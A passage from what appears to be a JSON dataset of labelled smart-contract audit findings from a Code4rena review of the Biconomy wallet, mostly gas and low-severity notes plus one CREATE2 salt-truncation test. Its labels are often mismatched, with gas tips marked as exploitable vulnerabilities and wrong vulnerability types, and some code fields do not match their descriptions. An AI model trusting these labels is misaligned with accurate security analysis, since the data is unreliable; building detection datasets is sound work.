    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.186,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n\n*/scw-contracts/contracts/smart-contract-wallet/libs/Math.sol*\nLinks: [36](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/libs/Math.sol#L36).\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Findings:",
    "description": "*/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol* Links: [200](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L200), [224](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L224). 200:\tuint256 startGas = gasleft() + 21000 + msg.data.length * 8; 224:\trequire(gasleft() >= max((_tx.targetTxGas * 64) / 63,_tx.targetTxGas + 2500) + 500, \"BSA010\"); */scw-contracts/contracts/smart-contract-wallet/libs/Math.sol*",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.2,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n//From\nfor (uint256 i; i < len; ++i) {\n\t//Do Something\n}\n//To\nfor (uint256 i; i < len;) {\n\t//Do Something\n\tunchecked { ++i; }\n}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Gas",
    "title": "[G-02] `uint256` Iterator Checked Each Iteration",
    "description": "A `uint256` iterator will not overflow before the check variable overflows. Unchecking the iterator increment saves gas. **Example** //From for (uint256 i; i < len; ++i) { //Do Something",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 11,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.137,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n74:\tfor (uint256 i = 0; i < opslen; i++) {\n80:\tfor (uint256 i = 0; i < opslen; i++) {\n100:\tfor (uint256 i = 0; i < opasLen; i++) {\n107:\tfor (uint256 a = 0; a < opasLen; a++) {\n112:\tfor (uint256 i = 0; i < opslen; i++) {\n128:\tfor (uint256 a = 0; a < opasLen; a++) {\n134:\tfor (uint256 i = 0; i < opslen; i++) {\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Findings:",
    "description": "*/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol* Links: [74](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L74), [80](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L80), [100](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L100), [107](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L107), [112](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L112), [128](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L128), [134](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L134). 74:\tfor (uint256 i = 0; i < opslen; i++) { 80:\tfor (uint256 i = 0; i < opslen; i++) { 100:\tfor (uint256 i = 0; i < opasLen; i++) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 9,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.318,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n//From\nif (a != HIGH && b != LOW) {\n\t//Do Something\n}\n//To\nif (a != HIGH) {\n\tif (b != LOW) {\n\t\t//Do Something\n\t}\n}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Gas",
    "title": "[G-03] && In If Statement(s)",
    "description": "Seperating if statements saves gas. **Example** //From if (a != HIGH && b != LOW) { //Do Something",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 12,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.124,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n\n*/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol*\nLinks: [303](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L303), [321](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L321), [365](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L365), [410](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L410).\n",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Medium",
    "title": "Findings:",
    "description": "*/scw-contracts/contracts/smart-contract-wallet/libs/Math.sol* Links: [147](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/libs/Math.sol#L147). 147:\tif (rounding == Rounding.Up && mulmod(x, y, denominator) > 0) { */scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol* Links: [303](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L303), [321](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L321), [365](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L365), [410](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L410).",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.662,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n148:\tresult += 1;\n237:\tresult += 1;\n286:\tresult += 1;\n329:\tresult += 1;\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Findings:",
    "description": "*/scw-contracts/contracts/smart-contract-wallet/libs/Math.sol* Links: [148](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/libs/Math.sol#L148), [237](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/libs/Math.sol#L237), [286](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/libs/Math.sol#L286), [329](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/libs/Math.sol#L329). 148:\tresult += 1; 237:\tresult += 1; 286:\tresult += 1;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.081,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n\nThe findings below display the first line which allows the second line to go ",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Gas",
    "title": "[G-05] `unchecked` Not Used on Overflow / Underflow Proof Arithmetic",
    "description": "Modern Solidity will automatically revert if a value overflows/underflows. More computation is used in order to force an overflow/underflow revert by default. When overflows/underflows are not possible (likely due to an earlier check), code can be placed inside an `unchecked` brace to save gas. unchecked { //Code } The findings below display the first line which allows the second line to go `unchecked`. ONLY the second line is suggested to be put in an `unchecked` brace.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.079,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n\n*/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol*\nLinks: [353 / 354](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L353-L354), [359 / 362](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L359-L362).\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Findings:",
    "description": "*/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol* Links: [344 / 347](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L344-L347). 344:\telse if(v > 30) { 347:\t_signer = ecrecover(keccak256(abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", dataHash)), v - 4, r, s); */scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol*",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.396,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n//From\nrequire(a != HIGH && b != LOW);\n//To\nrequire(a != HIGH);\nrequire(b != LOW);\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Gas",
    "title": "[G-06] && In Require Statement(s)",
    "description": "Seperating require statements saves gas. **Example** //From require(a != HIGH && b != LOW); //To",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.092,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n34:\trequire(module != address(0) && module != SENTINEL_MODULES, \"BSA101\");\n49:\trequire(module != address(0) && module != SENTINEL_MODULES, \"BSA101\");\n68:\trequire(msg.sender != SENTINEL_MODULES && modules[msg.sender] != address(0), \"BSA104\");\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Findings:",
    "description": "*/scw-contracts/contracts/smart-contract-wallet/base/ModuleManager.sol* Links: [34](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/base/ModuleManager.sol#L34), [49](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/base/ModuleManager.sol#L49), [68](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/base/ModuleManager.sol#L68). 34:\trequire(module != address(0) && module != SENTINEL_MODULES, \"BSA101\"); 49:\trequire(module != address(0) && module != SENTINEL_MODULES, \"BSA101\"); 68:\trequire(msg.sender != SENTINEL_MODULES && modules[msg.sender] != address(0), \"BSA104\");",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.251,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "<address>code.length >0",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "[NC-04] Missing contract-existence checks before low-level calls",
    "description": "Low-level calls return success if there is no code present at the specified address. File Executor.sol: [28](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/base/Executor.sol#L28) Recommended Mitigation Steps: add a check to verify that `<address>code.length >0`",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.023,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "diff\ndiff --git a/entrypoint.test.ts.orig b/entrypoint.test.ts\nindex 29e930c..b811d5e 100644\n--- a/entrypoint.test.ts.orig\n+++ b/entrypoint.test.ts\n@@ -1424,3 +1424,59 @@ describe(\"EntryPoint\", function () {\n     });\n   });\n });\n+\n+describe(\"Deployment\", function () {\n+  it.only(\"Deterministic salt truncated\", async () => {\n+\n+    let baseImpl;\n+    let walletFactory;\n+    let owner;\n+    let accounts;\n+    let user;\n+    let other;\n+\n+    // Get accounts\n+    accounts = await ethers.getSigners();\n+    owner = await accounts[0];\n+    user = await accounts[1];\n+    other = await accounts[2];\n+\n+    // Deploy smart account implementation\n+    const BaseImplementation = await ethers.getContractFactory(\"SmartAccount\");\n+    baseImpl = await BaseImplementation.deploy();\n+    await baseImpl.deployed();\n+\n+    const WalletFactory = await ethers.getContractFactory(\"SmartAccountFactory\");\n+    walletFactory = await WalletFactory.deploy(baseImpl.address);\n+    await walletFactory.deployed();\n+\n+    /*\n+      The least significant 160 bits are same between salt1 and salt2\n+      The least significant 160 bits are different between salt1 and salt3\n+\n+      salt1 = 0x00ffffffffffffffffffffffffffffffffffffffff\n+      salt2 = 0x99ffffffffffffffffffffffffffffffffffffffff\n+      salt3 = 0x00ffffffffffffffffffffffffffffffffffffff00\n+    */\n+\n+    let salt1 = BigNumber.from(\"1461501637330902918203684832716283019655932542975\");\n+    let salt2 = BigNumber.from(\"225071252148959049403367464238307585027013611618303\");\n+    let salt3 = BigNumber.from(\"1461501637330902918203684832716283019655932542720\");\n+\n+    // First deploy works fine\n+    await walletFactory.connect(user).deployCounterFactualWallet(user.address, other.address, other.address, salt1);\n+\n+    // salt1 and salt2 are different values (difference is not within the 160 least significant bits)\n+    expect(salt1).to.not.equal(salt2);\n+\n+    // But deployment will still fail\n+    await expect(walletFactory.connect(user).deployCounterFactualWallet(user.address, other.address, other.address, salt2))\n+      .to.be.revertedWith(\"Create2 call failed\");\n+\n+    // salt1 and salt3 are different values (difference is within the 160 least significant bits)\n+    expect(salt1).to.not.equal(salt3);\n+\n+    // This deployment will work\n+    walletFactory.connect(user).deployCounterFactualWallet(user.address, other.address, other.address, salt3);\n+  });\n+});\n\\ No newline at end of file\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Test",
    "description": "A test demonstrating this behavior is shown below: diff --git a/entrypoint.test.ts.orig b/entrypoint.test.ts index 29e930c..b811d5e 100644 --- a/entrypoint.test.ts.orig +++ b/entrypoint.test.ts",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 67,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": " \n    But the compliant magic value for the eip is: 0x1626ba7e\n\n    2: Update the \"isValidSignature\" parameters. \n        In the validation signature, the interface for isValidSignature is: \n\n \n       function isValidSignature(bytes memory _data, bytes memory _signature) public view virtual returns (bytes4);\n   \n      But the correct compliant interface is: \n\n      function isValidSignature(\n    bytes32 _hash, \n    bytes memory _signature)\n    public\n    view \n    returns (bytes4 magicValue);\n\n\n3. Incorrect \"validateUserOp\" implementation. \n    If an invalid signature is provided in \"validateUserOp\", we should return an invalid message instead of reverting.\n   As stated from the eip: \"SHOULD return SIG_VALIDATION_FAILED (and not revert) on signature mismatch.\"\n\n  The current implementation just reverts if the signatures don't belong to the owner: \n   https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L506\n\n  ",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "High",
    "title": "1. The entry point address must be a contract, currently, there is no input validation. You can provide an EOA as the entry point.",
    "description": "Instances: - https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L173 - https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L173 Recommendation: Check that the entry point has code.",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 27,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.991,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: contracts/smart-contract-wallet/SmartAccount.sol\n166:     function init(address _owner, address _entryPointAddress, address _handler) public override initializer { \n167:         require(owner == address(0), \"Already initialized\");\n168:         require(address(_entryPoint) == address(0), \"Already initialized\");\n169:         require(_owner != address(0),\"Invalid owner\");\n170:         require(_entryPointAddress != address(0), \"Invalid Entrypoint\");\n171:         require(_handler != address(0), \"Invalid Entrypoint\");\n172:         owner = _owner;\n173:         _entryPoint =  IEntryPoint(payable(_entryPointAddress));\n174:         if (_handler != address(0)) internalSetFallbackHandler(_handler); // @audit-info if can be removed and internalSetFallbackHandler(_handler); can always be set - require(_handler != address(0), \"Invalid Entrypoint\"); checks for this\n175:         setupModules(address(0), bytes(\"\"));\n176:     }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "L-01 Unneccessary if condition for a check that is always true",
    "description": "In SmartAccount is a if condition that is always true and can be removed as it is checked 3 lines above with a require. File: contracts/smart-contract-wallet/SmartAccount.sol 166:     function init(address _owner, address _entryPointAddress, address _handler) public override initializer { 167:         require(owner == address(0), \"Already initialized\"); 168:         require(address(_entryPoint) == address(0), \"Already initialized\");",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.938,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: contracts/smart-contract-wallet/SmartAccountFactory.sol\n53:     function deployWallet(address _owner, address _entryPoint, address _handler) public returns(address proxy){\n54:         bytes memory deploymentData = abi.encodePacked(type(Proxy).creationCode, uint(uint160(_defaultImpl)));\n55:         // solhint-disable-next-line no-inline-assembly\n56:         assembly {\n57:             proxy := create(0x0, add(0x20, deploymentData), mload(deploymentData))\n58:         }\n59:         BaseSmartAccount(proxy).init(_owner, _entryPoint, _handler);\n60:         isAccountExist[proxy] = true;\n61:     }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "L-02 Function deployWallet can be removed as it is not possible to check for deployed addresses",
    "description": "SmartAccountFactory has the ability to deploy a new Wallet via deployWallet via a create instead of a create2. It also doesn't emit the SmartAccountCreated event and so any deployed Wallet via this function can't be found via the event and also not via the getAddressForCounterfactualWallet function. For Wallets created via this way, the frontends will not work. File: contracts/smart-contract-wallet/SmartAccountFactory.sol 53:     function deployWallet(address _owner, address _entryPoint, address _handler) public returns(address proxy){ 54:         bytes memory deploymentData = abi.encodePacked(type(Proxy).creationCode, uint(uint160(_defaultImpl))); 55:         // solhint-disable-next-line no-inline-assembly",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 12,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.611,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: contracts/smart-contract-wallet/paymasters/BasePaymaster.sol\n20:     constructor(IEntryPoint _entryPoint) {\n21:         setEntryPoint(_entryPoint);\n22:     }\n\nFile: contracts/smart-contract-wallet/paymasters/BasePaymaster.sol\n24:     function setEntryPoint(IEntryPoint _entryPoint) public onlyOwner {\n25:         entryPoint = _entryPoint;\n26:     }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "L-03 Always check important state vars before update",
    "description": "At the moment the update for entryPoint is not checked in the constructor and not in the update function to not be the zero address. This can lead to unexpected behavior. You should add the require(_entryPoint != address(0)) check. File: contracts/smart-contract-wallet/paymasters/BasePaymaster.sol 20:     constructor(IEntryPoint _entryPoint) { 21:         setEntryPoint(_entryPoint); 22:     }",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 12,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.365,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: contracts/smart-contract-wallet/aa-4337/interfaces/IEntryPoint.sol\n123:     error SimulationResult(uint256 preOpGas, uint256 prefund, uint256 deadline,\n124:         StakeInfo senderInfo, StakeInfo factoryInfo, StakeInfo paymasterInfo);\n125:     // @audit-info unknown definition, should be\n126:     // error ValidationResult(ReturnInfo returnInfo, StakeInfo senderInfo, StakeInfo factoryInfo, StakeInfo paymasterInfo);\n\nFile: contracts/smart-contract-wallet/aa-4337/interfaces/IEntryPoint.sol\n140:     error SimulationResultWithAggregation(uint256 preOpGas, uint256 prefund, uint256 deadline,\n141:         StakeInfo senderInfo, StakeInfo factoryInfo, StakeInfo paymasterInfo, AggregatorStakeInfo aggregatorInfo);\n142:     // @audit-info unknown definition, should be\n143:     // error ValidationResultWithAggregation(ReturnInfo returnInfo, StakeInfo senderInfo, StakeInfo factoryInfo, StakeInfo paymasterInfo, AggregatorStakeInfo aggregatorInfo);\n\nFile: contracts/smart-contract-wallet/aa-4337/interfaces/IEntryPoint.sol\n145:     // @audit-info missing completly\n146:     /*\n147:         struct ReturnInfo {\n148:             uint256 preOpGas;\n149:             uint256 prefund;\n150:             bool sigFailed;\n151:             uint64 validAfter;\n152:             uint64 validUntil;\n153:             bytes paymasterContext;\n154:         }\n155:     */\n\nFile: contracts/smart-contract-wallet/aa-4337/interfaces/IPaymaster.sol\n26:     function validatePaymasterUserOp(UserOperation calldata userOp, bytes32 userOpHash, uint256 maxCost)\n27:     external returns (bytes memory context, uint256 deadline); \n28:     // @audit-info return is not deadline, its a sigTimeRange that is a uint256 and holds the information for\n29:     // sigFailure + validUntil + validAfter\n\nFile: contracts/smart-contract-wallet/aa-4337/interfaces/IAccount.sol\n24:     function validateUserOp(UserOperation calldata userOp, bytes32 userOpHash, address aggregator, uint256 missingAccountFunds)\n25:     external returns (uint256 deadline);\n26:     // @audit-info return is not deadline, its a sigTimeRange that is a uint256 and holds the information for\n27:     // sigFailure + validUntil + validAfter\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "L-04 Deviating interfaces to current EIP-4337",
    "description": "Some interfaces deviate to the current EIP-4337 https://eips.ethereum.org/EIPS/eip-4337. File: contracts/smart-contract-wallet/aa-4337/interfaces/IEntryPoint.sol 123:     error SimulationResult(uint256 preOpGas, uint256 prefund, uint256 deadline, 124:         StakeInfo senderInfo, StakeInfo factoryInfo, StakeInfo paymasterInfo); 125:     // @audit-info unknown definition, should be",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 39,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: EntryPoint.sol\n75:             _validatePrepayment(i, ops[i], opInfos[i], address(0));\n\nFile: EntryPoint.sol\n113:                 _validatePrepayment(opIndex, ops[i], opInfos[opIndex], address(aggregator));\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "L-05 Return value not checked",
    "description": "The return value from function _validatePrepayment is not checked and can lead to unexpected behaviour. File: EntryPoint.sol 75:             _validatePrepayment(i, ops[i], opInfos[i], address(0)); File: EntryPoint.sol 113:                 _validatePrepayment(opIndex, ops[i], opInfos[opIndex], address(aggregator));",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.223,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: StakeManager.sol\n59:     function addStake(uint32 _unstakeDelaySec) public payable {\n60:         DepositInfo storage info = deposits[msg.sender];\n61:         require(_unstakeDelaySec > 0, \"must specify unstake delay\");\n62:         require(_unstakeDelaySec >= info.unstakeDelaySec, \"cannot decrease unstake time\");\n63:         uint256 stake = info.stake + msg.value;\n64:         require(stake > 0, \"no stake specified\");\n65:         require(stake < type(uint112).max, \"stake overflow\");\n66:         deposits[msg.sender] = DepositInfo(\n67:             info.deposit,\n68:             true,\n69:             uint112(stake),\n70:             _unstakeDelaySec,\n71:             0\n72:         );\n73:         emit StakeLocked(msg.sender, stake, _unstakeDelaySec);\n74:     }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "L-06 Inconsistent minimum stake delay",
    "description": "At the moment there is no minimum stake-delay and so you can add a stake with a delay of only 1 second. You can always withdraw your stake after only 1 second. Consider adding a minimum value to check against. File: StakeManager.sol 59:     function addStake(uint32 _unstakeDelaySec) public payable { 60:         DepositInfo storage info = deposits[msg.sender]; 61:         require(_unstakeDelaySec > 0, \"must specify unstake delay\");",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 19,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.777,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
